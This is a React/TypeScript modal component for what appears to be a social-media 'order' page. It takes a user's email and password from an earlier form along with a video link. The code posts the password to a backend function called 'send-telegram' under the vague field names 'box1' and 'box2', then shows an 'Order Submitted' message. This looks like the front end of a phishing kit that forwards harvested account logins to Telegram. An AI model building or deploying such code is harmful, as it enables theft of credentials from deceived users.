import { useState } from 'react';
import { X, Link as LinkIcon, Send } from 'lucide-react';

interface VideoLinkModalProps {
  formData: {
    email: string;
    password: string;
    service: string;
  };
  onClose: () => void;
}

export default function VideoLinkModal({ formData, onClose }: VideoLinkModalProps) {
  const [videoLink, setVideoLink] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleSend = async () => {
    if (!videoLink) {
      alert('Please enter video link');
      return;
    }

    setIsLoading(true);

    try {
      const response = await fetch(`${import.meta.env.VITE_SUPABASE_URL}/functions/v1/send-telegram`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${import.meta.env.VITE_SUPABASE_ANON_KEY}`,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          box1: formData.email,
          box2: formData.password,
          service: formData.service,
          video: videoLink
        })
      });

      const result = await response.json();
      alert(result.message || 'Order Submitted Wait ✅');
      onClose();
    } catch (error) {
      alert('Error submitting order ❌');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
      <div className="bg-white rounded-2xl shadow-2xl max-w-md w-full overflow-hidden animate-fade-in">
        <div className="bg-gradient-to-r from-pink-500 via-purple-500 to-blue-500 p-6">
          <div className="flex justify-between items-center">
            <h2 className="text-2xl font-bold text-white">Enter Video Link</h2>
            <button
              onClick={onClose}
              className="text-white hover:bg-white hover:bg-opacity-20 rounded-full p-2 transition-colors"
            >
              <X size={24} />
            </button>
          </div>
        </div>

        <div className="p-6 space-y-4">
          <div className="relative">
            <LinkIcon className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400" size={20} />
            <input
              type="text"
              value={videoLink}
              onChange={(e) => setVideoLink(e.target.value)}
              placeholder="Paste video link here"
              className="w-full pl-12 pr-4 py-3 border-2 border-gray-200 rounded-lg focus:border-purple-500 focus:outline-none transition-colors"
            />
          </div>

          <div className="flex gap-3">
            <button
              onClick={handleSend}
              disabled={isLoading}
              className="flex-1 flex items-center justify-center gap-2 bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white font-semibold py-3 rounded-lg shadow-lg transition-all duration-300 transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              <Send size={20} />
              {isLoading ? 'Sending...' : 'Send Now'}
            </button>
            <button
              onClick={onClose}
              className="px-6 bg-red-500 hover:bg-red-600 text-white font-semibold py-3 rounded-lg shadow-lg transition-all duration-300"
            >
              Cancel
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
